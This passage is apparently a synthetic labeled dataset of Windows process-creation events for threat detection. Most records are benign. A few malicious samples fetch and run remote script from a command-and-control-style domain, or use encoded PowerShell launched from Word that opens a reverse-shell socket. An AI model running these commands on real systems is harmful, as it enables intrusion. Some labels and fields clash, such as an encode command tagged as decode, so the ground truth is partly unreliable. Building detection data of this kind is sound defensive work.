  {
    "UtcTime": "2024-07-02T16:12:16.751Z",
    "ProcessGuid": "{055D6183-A20B-4B32-8E61-E7BD7067EF51}",
    "ProcessId": 59086,
    "Image": "C:\\Windows\\regedit.exe",
    "CommandLine": "regedit.exe",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentProcessId": 42066,
    "User": "CORP\\sysadmin",
    "IntegrityLevel": "High",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-01T08:03:51.483Z",
    "ProcessGuid": "{E41CB554-E0CA-4194-B952-CE554CEFA80F}",
    "ProcessId": 35696,
    "Image": "C:\\Windows\\servicing\\TrustedInstaller.exe",
    "CommandLine": "C:\\Windows\\servicing\\TrustedInstaller.exe",
    "ParentImage": "C:\\Windows\\System32\\svchost.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\svchost.exe -k netsvcs",
    "ParentProcessId": 24424,
    "User": "NT AUTHORITY\\SYSTEM",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-02T08:51:54.821Z",
    "ProcessGuid": "{C8994DD9-7FC5-4C4E-969A-6F1EA083D0CF}",
    "ProcessId": 54086,
    "Image": "C:\\Windows\\System32\\msiexec.exe",
    "CommandLine": "msiexec.exe /i C:\\Temp\\update_3.8.97.msi /passive /norestart",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentProcessId": 40323,
    "User": "CORP\\admin",
    "IntegrityLevel": "High",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-02T10:32:34.710Z",
    "ProcessGuid": "{23D41EEA-E676-4705-9B75-1DC84A0B11BE}",
    "ProcessId": 42738,
    "Image": "C:\\Windows\\System32\\perfmon.exe",
    "CommandLine": "perfmon.exe",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentProcessId": 22127,
    "User": "CORP\\itops",
    "IntegrityLevel": "High",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-01T23:27:05.440Z",
    "ProcessGuid": "{FF1032AE-96D3-4BFA-B13D-8835D232AF37}",
    "ProcessId": 40482,
    "Image": "C:\\Windows\\System32\\taskhostw.exe",
    "CommandLine": "taskhostw.exe",
    "ParentImage": "C:\\Windows\\System32\\services.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\services.exe",
    "ParentProcessId": 54892,
    "User": "NT AUTHORITY\\LOCAL SERVICE",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-02T12:44:59.699Z",
    "ProcessGuid": "{2B91EAE2-6ED4-4E98-93C3-42B61ECEF12F}",
    "ProcessId": 43469,
    "Image": "C:\\Windows\\System32\\notepad.exe",
    "CommandLine": "notepad.exe",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe /factory,{GUID}",
    "ParentProcessId": 5679,
    "User": "CORP\\mjones",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-05T08:30:07.264Z",
    "ProcessGuid": "{6B4E3A12-FED5-4451-8D9E-69725FE115A4}",
    "ProcessId": 5427,
    "Image": "C:\\Program Files\\Microsoft OneDrive\\OneDrive.exe",
    "CommandLine": "OneDrive.exe /sync",
    "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\POWERPNT.EXE",
    "ParentCommandLine": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\POWERPNT.EXE\"",
    "ParentProcessId": 26078,
    "User": "CORP\\helpdesk",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-05T09:19:13.766Z",
    "ProcessGuid": "{90B3E2C0-5E35-4EB6-B8A7-527FAC53105D}",
    "ProcessId": 49590,
    "Image": "C:\\Windows\\System32\\eventvwr.exe",
    "CommandLine": "eventvwr.exe",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentProcessId": 60214,
    "User": "CORP\\itops",
    "IntegrityLevel": "High",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-01T09:53:36.685Z",
    "ProcessGuid": "{7550253F-351C-48B9-9D0C-B9CCB3738757}",
    "ProcessId": 33381,
    "Image": "C:\\Users\\sysadmin\\Downloads\\installer.exe",
    "CommandLine": "installer.exe --silent --accept-license",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentProcessId": 10774,
    "User": "CORP\\sysadmin",
    "IntegrityLevel": "High",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-03T23:55:21.823Z",
    "ProcessGuid": "{6F6F4EB5-636F-44E3-A0B0-7FB84F5D333B}",
    "ProcessId": 8547,
    "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE",
    "CommandLine": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE\"",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe /factory,{GUID}",
    "ParentProcessId": 31692,
    "User": "CORP\\helpdesk",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-05T17:25:49.334Z",
    "ProcessGuid": "{DD28D9A7-B395-4A5B-A3F8-DE0B159A44B2}",
    "ProcessId": 2941,
    "Image": "C:\\Windows\\System32\\cmd.exe",
    "CommandLine": "cmd.exe /c net user",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentProcessId": 42557,
    "User": "CORP\\netadmin",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-05T08:58:38.763Z",
    "ProcessGuid": "{506CC0BE-B268-41E8-A16F-567BAEF664D1}",
    "ProcessId": 33553,
    "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
    "CommandLine": "chrome.exe --no-first-run",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe /factory,{GUID}",
    "ParentProcessId": 55580,
    "User": "CORP\\analyst02",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-02T15:21:23.845Z",
    "ProcessGuid": "{E298D1CA-88F4-4D03-899A-708E8E0D1E95}",
    "ProcessId": 4556,
    "Image": "C:\\Windows\\System32\\msiexec.exe",
    "CommandLine": "msiexec.exe /i C:\\Installers\\app_setup_5.8.71.msi /quiet",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentProcessId": 54515,
    "User": "CORP\\admin",
    "IntegrityLevel": "High",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-02T03:16:55.603Z",
    "ProcessGuid": "{534233A0-9120-4229-A830-A5CB7B970F14}",
    "ProcessId": 4665,
    "Image": "C:\\Windows\\System32\\wscript.exe",
    "CommandLine": "wscript.exe //e:jscript http://cobaltstrike6398.xyz/script224.js",
    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
    "ParentCommandLine": "cmd.exe /c",
    "ParentProcessId": 33136,
    "User": "CORP\\agarwal",
    "IntegrityLevel": "Medium",
    "is_malicious": 1,
    "mitre_technique_id": "T1059.005",
    "technique_name": "WScript Remote Script",
    "label": "malicious"
  },
  {
    "UtcTime": "2024-07-03T15:36:50.248Z",
    "ProcessGuid": "{080A0336-0779-43E8-AE73-661602F41FF9}",
    "ProcessId": 22357,
    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "CommandLine": "powershell.exe -NoProfile -Command \"Get-EventLog -LogName System -Newest 50\"",
    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\cmd.exe",
    "ParentProcessId": 25645,
    "User": "CORP\\jsmith",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-04T02:29:51.654Z",
    "ProcessGuid": "{E72AF692-3CBF-4307-9C20-978D0732C207}",
    "ProcessId": 4978,
    "Image": "C:\\Windows\\System32\\schtasks.exe",
    "CommandLine": "schtasks.exe /run /tn \"\\Microsoft\\Windows\\WindowsUpdate\\Automatic App Update\"",
    "ParentImage": "C:\\Windows\\System32\\svchost.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\svchost.exe -k netsvcs -p -s Schedule",
    "ParentProcessId": 24653,
    "User": "NT AUTHORITY\\SYSTEM",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-01T08:45:08.718Z",
    "ProcessGuid": "{D4FA767C-AC73-4ACE-8002-B9950D515FD2}",
    "ProcessId": 1743,
    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "CommandLine": "powershell.exe -NoProfile -Command \"Install-Module -Name Az -AllowClobber -Force\"",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentProcessId": 11736,
    "User": "CORP\\mjones",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-04T17:09:50.596Z",
    "ProcessGuid": "{F55E9C3C-6056-4263-B401-42AECDBDD659}",
    "ProcessId": 54769,
    "Image": "C:\\Windows\\System32\\odbcad32.exe",
    "CommandLine": "odbcad32.exe",
    "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE",
    "ParentCommandLine": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE\"",
    "ParentProcessId": 51298,
    "User": "CORP\\klee",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-04T08:01:05.223Z",
    "ProcessGuid": "{FAB7526A-6B68-469C-868A-F84AB86FA348}",
    "ProcessId": 16247,
    "Image": "C:\\Windows\\explorer.exe",
    "CommandLine": "explorer.exe C:\\Users\\dbadmin\\Documents",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe /factory,{GUID}",
    "ParentProcessId": 34118,
    "User": "CORP\\dbadmin",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-05T17:44:08.428Z",
    "ProcessGuid": "{E7119FE7-5BDF-4A6D-B73D-4A3AA5DFF903}",
    "ProcessId": 55437,
    "Image": "C:\\Users\\itops\\Downloads\\installer.exe",
    "CommandLine": "installer.exe --silent --accept-license",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentProcessId": 59892,
    "User": "CORP\\itops",
    "IntegrityLevel": "High",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-03T05:40:56.986Z",
    "ProcessGuid": "{CC90AE03-19BD-4D71-9741-E98FCBACC6BA}",
    "ProcessId": 6814,
    "Image": "C:\\Windows\\System32\\svchost.exe",
    "CommandLine": "C:\\Windows\\System32\\svchost.exe -k netsvcs -p -s wuauserv",
    "ParentImage": "C:\\Windows\\System32\\svchost.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\svchost.exe -k netsvcs",
    "ParentProcessId": 54848,
    "User": "NT AUTHORITY\\SYSTEM",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-05T16:18:45.986Z",
    "ProcessGuid": "{38BDA228-77A2-4614-A74C-62ECDD28A3B0}",
    "ProcessId": 40155,
    "Image": "C:\\Program Files\\Microsoft OneDrive\\OneDrive.exe",
    "CommandLine": "OneDrive.exe /sync",
    "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\POWERPNT.EXE",
    "ParentCommandLine": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\POWERPNT.EXE\"",
    "ParentProcessId": 4765,
    "User": "CORP\\analyst02",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-03T02:24:53.905Z",
    "ProcessGuid": "{B6665F8F-98BF-4498-BE46-F21DF5E7D73E}",
    "ProcessId": 38381,
    "Image": "C:\\Windows\\System32\\certutil.exe",
    "CommandLine": "certutil.exe -encode C:\\Users\\Public\\decoded2942.exe C:\\Users\\Public\\encoded4370.txt",
    "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "ParentCommandLine": "cmd.exe",
    "ParentProcessId": 15711,
    "User": "CORP\\agarwal",
    "IntegrityLevel": "Medium",
    "is_malicious": 1,
    "mitre_technique_id": "T1140",
    "technique_name": "Certutil Base64 Decode",
    "label": "malicious"
  },
  {
    "UtcTime": "2024-07-02T12:30:49.238Z",
    "ProcessGuid": "{A359D2F2-259C-4B9D-9BA4-E8E86C0CFE41}",
    "ProcessId": 60643,
    "Image": "C:\\Program Files\\Adobe\\Acrobat DC\\Acrobat\\Acrobat.exe",
    "CommandLine": "Acrobat.exe C:\\Users\\analyst02\\Documents\\report.pdf",
    "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
    "ParentCommandLine": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\"",
    "ParentProcessId": 57298,
    "User": "CORP\\analyst02",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-01T16:59:27.858Z",
    "ProcessGuid": "{274E9E96-6AFB-435A-AC9E-843E1CC64DAC}",
    "ProcessId": 39346,
    "Image": "C:\\Users\\sysadmin\\Downloads\\setup.exe",
    "CommandLine": "setup.exe /S /v/qn",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentProcessId": 32649,
    "User": "CORP\\sysadmin",
    "IntegrityLevel": "High",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-05T17:20:25.603Z",
    "ProcessGuid": "{EF5F3037-270C-492B-850A-F17760D91F3A}",
    "ProcessId": 3948,
    "Image": "C:\\Windows\\System32\\schtasks.exe",
    "CommandLine": "schtasks.exe /run /tn \"\\Microsoft\\Windows\\Defrag\\ScheduledDefrag\"",
    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
    "ParentCommandLine": "cmd.exe",
    "ParentProcessId": 33209,
    "User": "CORP\\admin",
    "IntegrityLevel": "High",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "gray_area"
  },
  {
    "UtcTime": "2024-07-04T16:08:46.228Z",
    "ProcessGuid": "{629BE68B-7930-43C4-9922-065D4E29DB25}",
    "ProcessId": 55710,
    "Image": "C:\\Windows\\System32\\cmd.exe",
    "CommandLine": "cmd.exe /c systeminfo",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentProcessId": 1227,
    "User": "CORP\\dbadmin",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-04T10:53:37.612Z",
    "ProcessGuid": "{6FEF19CB-070D-4B55-B138-0920E024455B}",
    "ProcessId": 6641,
    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "CommandLine": "powershell.exe -exec bypass -noni -nop -w hidden -enc JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AUwBvAGMAawBlAHQAcwAuAFQAQwBQAEMAbABpAGUAbgB0ACgAJwAxADAALgAwAC4AMAAuADEAJwAsADQANAA0ADQAKQA7ACQAcwA9ACQAYwAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA=",
    "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
    "ParentCommandLine": "WINWORD.EXE /n",
    "ParentProcessId": 10413,
    "User": "CORP\\klee",
    "IntegrityLevel": "Medium",
    "is_malicious": 1,
    "mitre_technique_id": "T1059.001",
    "technique_name": "PowerShell Encoded Command",
    "label": "malicious"
  },
  {
    "UtcTime": "2024-07-03T17:09:05.670Z",
    "ProcessGuid": "{B4EDB30F-D409-42D7-A1D4-7DCB7BCD9CA2}",
    "ProcessId": 62052,
    "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
    "CommandLine": "chrome.exe --type=renderer --field-trial-handle=12345",
    "ParentImage": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
    "ParentCommandLine": "\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\"",
    "ParentProcessId": 59030,
    "User": "CORP\\agarwal",
    "IntegrityLevel": "Low",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-04T03:47:47.381Z",
    "ProcessGuid": "{AF729311-9763-4E7A-816C-89CD5B1F479C}",
    "ProcessId": 54200,
    "Image": "C:\\Windows\\System32\\svchost.exe",
    "CommandLine": "C:\\Windows\\System32\\svchost.exe -k LocalService -p",
    "ParentImage": "C:\\Windows\\System32\\services.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\services.exe",
    "ParentProcessId": 9527,
    "User": "NT AUTHORITY\\SYSTEM",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-02T11:25:32.050Z",
    "ProcessGuid": "{690F1AD8-6EE6-4E6C-B91E-8F76B6D882C8}",
    "ProcessId": 45379,
    "Image": "C:\\Windows\\System32\\wuauclt.exe",
    "CommandLine": "wuauclt.exe /detectnow /updatenow",
    "ParentImage": "C:\\Windows\\System32\\svchost.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\svchost.exe -k netsvcs",
    "ParentProcessId": 20584,
    "User": "NT AUTHORITY\\SYSTEM",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-02T11:41:14.693Z",
    "ProcessGuid": "{131428C9-B2FF-491C-A95C-7F47CFE84EF4}",
    "ProcessId": 14548,
    "Image": "C:\\Windows\\System32\\msiexec.exe",
    "CommandLine": "msiexec.exe /i C:\\Installers\\app_setup_1.2.73.msi /quiet",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentProcessId": 18634,
    "User": "CORP\\sysadmin",
    "IntegrityLevel": "High",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-03T17:18:04.395Z",
    "ProcessGuid": "{30D1FA35-7702-4D8B-8E60-0B2784C3B487}",
    "ProcessId": 34046,
    "Image": "C:\\Windows\\System32\\taskhostw.exe",
    "CommandLine": "taskhostw.exe",
    "ParentImage": "C:\\Windows\\System32\\services.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\services.exe",
    "ParentProcessId": 30514,
    "User": "NT AUTHORITY\\SYSTEM",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-01T09:29:28.038Z",
    "ProcessGuid": "{936D5BDD-A3E3-4A8A-9C01-1091211EC671}",
    "ProcessId": 4728,
    "Image": "C:\\Windows\\System32\\lsass.exe",
    "CommandLine": "C:\\Windows\\System32\\lsass.exe",
    "ParentImage": "C:\\Windows\\System32\\services.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\services.exe",
    "ParentProcessId": 25165,
    "User": "NT AUTHORITY\\NETWORK SERVICE",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-01T16:31:58.212Z",
    "ProcessGuid": "{CB88C3A4-4794-4A0B-A04A-961F1E9CE9D9}",
    "ProcessId": 46102,
    "Image": "C:\\Users\\sysadmin\\Downloads\\setup.exe",
    "CommandLine": "setup.exe /S /v/qn",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentProcessId": 62153,
    "User": "CORP\\sysadmin",
    "IntegrityLevel": "High",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-04T14:57:49.598Z",
    "ProcessGuid": "{899ACCA0-CBB5-442A-93D6-9C7D923D8802}",
    "ProcessId": 63001,
    "Image": "C:\\Windows\\System32\\calc.exe",
    "CommandLine": "calc.exe",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe /factory,{GUID}",
    "ParentProcessId": 46581,
    "User": "CORP\\jsmith",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-04T09:28:47.342Z",
    "ProcessGuid": "{44976358-918F-4F79-AE1C-57C6C993678C}",
    "ProcessId": 18024,
    "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
    "CommandLine": "chrome.exe --type=renderer --field-trial-handle=12345",
    "ParentImage": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
    "ParentCommandLine": "\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\"",
    "ParentProcessId": 24656,
    "User": "CORP\\pchen",
    "IntegrityLevel": "Low",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-01T09:56:16.182Z",
    "ProcessGuid": "{2CF074B0-41F1-402D-8584-2D77E7202481}",
    "ProcessId": 39049,
    "Image": "C:\\Program Files\\Adobe\\Acrobat DC\\Acrobat\\Acrobat.exe",
    "CommandLine": "Acrobat.exe",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe /factory,{GUID}",
    "ParentProcessId": 64080,
    "User": "CORP\\dbadmin",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-04T11:55:59.077Z",
    "ProcessGuid": "{8454F597-BE76-4207-88E1-C74D118A73FF}",
    "ProcessId": 30041,
    "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE",
    "CommandLine": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE\"",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe /factory,{GUID}",
    "ParentProcessId": 53954,
    "User": "CORP\\analyst02",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-03T06:11:38.156Z",
    "ProcessGuid": "{F4593E58-95E6-4CF0-8FB3-672E55CBA305}",
    "ProcessId": 50821,
    "Image": "C:\\Windows\\System32\\svchost.exe",
    "CommandLine": "C:\\Windows\\System32\\svchost.exe -k LocalService -p",
    "ParentImage": "C:\\Windows\\System32\\services.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\services.exe",
    "ParentProcessId": 50751,
    "User": "NT AUTHORITY\\SYSTEM",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-01T17:30:10.536Z",
    "ProcessGuid": "{01639A25-B366-49FE-BADE-6062171FD865}",
    "ProcessId": 42223,
    "Image": "C:\\Windows\\System32\\cmd.exe",
    "CommandLine": "cmd.exe /c xcopy C:\\Data D:\\Backup /s /e",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentProcessId": 48263,
    "User": "CORP\\klee",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-05T15:39:46.144Z",
    "ProcessGuid": "{1259C5C0-8EF9-47C8-8B7E-EDB3D5695E22}",
    "ProcessId": 46552,
    "Image": "C:\\Program Files\\Docker\\Docker\\resources\\bin\\docker.exe",
    "CommandLine": "docker.exe ps -a",
    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
    "ParentCommandLine": "cmd.exe",
    "ParentProcessId": 46793,
    "User": "CORP\\mjones",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-02T17:46:38.540Z",
    "ProcessGuid": "{39BF0897-1409-4A46-BCA2-58714260A925}",
    "ProcessId": 28738,
    "Image": "C:\\Windows\\System32\\spoolsv.exe",
    "CommandLine": "C:\\Windows\\System32\\spoolsv.exe",
    "ParentImage": "C:\\Windows\\System32\\services.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\services.exe",
    "ParentProcessId": 8286,
    "User": "NT AUTHORITY\\SYSTEM",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-01T01:58:38.210Z",
    "ProcessGuid": "{65EC55EE-705D-4C6E-995A-62A8B0B14185}",
    "ProcessId": 39509,
    "Image": "C:\\Windows\\System32\\cmd.exe",
    "CommandLine": "cmd.exe /c powershell.exe -ep bypass -enc JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AUwBvAGMAawBlAHQAcwAuAFQAQwBQAEMAbABpAGUAbgB0ACgAJwAxADAALgAwAC4AMAAuADEAJwAsADQANAA0ADQAKQA7ACQAcwA9ACQAYwAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA=",
    "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
    "ParentCommandLine": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\" /n document6.docm",
    "ParentProcessId": 60059,
    "User": "CORP\\jsmith",
    "IntegrityLevel": "Medium",
    "is_malicious": 1,
    "mitre_technique_id": "T1204.002",
    "technique_name": "Office Macro Execution",
    "label": "malicious"
  },
  {
    "UtcTime": "2024-07-03T19:39:57.494Z",
    "ProcessGuid": "{4D527E12-FDD1-41B8-96A5-5C6FA7562919}",
    "ProcessId": 47170,
    "Image": "C:\\Windows\\System32\\wuauclt.exe",
    "CommandLine": "wuauclt.exe /detectnow /updatenow",
    "ParentImage": "C:\\Windows\\System32\\svchost.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\svchost.exe -k netsvcs",
    "ParentProcessId": 3031,
    "User": "NT AUTHORITY\\SYSTEM",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-05T05:49:08.443Z",
    "ProcessGuid": "{826F02ED-02F8-4843-8D8A-409E43E4CA1F}",
    "ProcessId": 33955,
    "Image": "C:\\Windows\\System32\\taskhostw.exe",
    "CommandLine": "taskhostw.exe",
    "ParentImage": "C:\\Windows\\System32\\services.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\services.exe",
    "ParentProcessId": 60684,
    "User": "NT AUTHORITY\\NETWORK SERVICE",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-01T10:07:02.964Z",
    "ProcessGuid": "{FD410821-066F-40D4-BDC3-9C81720B83F5}",
    "ProcessId": 31211,
    "Image": "C:\\Windows\\servicing\\TrustedInstaller.exe",
    "CommandLine": "C:\\Windows\\servicing\\TrustedInstaller.exe",
    "ParentImage": "C:\\Windows\\System32\\svchost.exe",
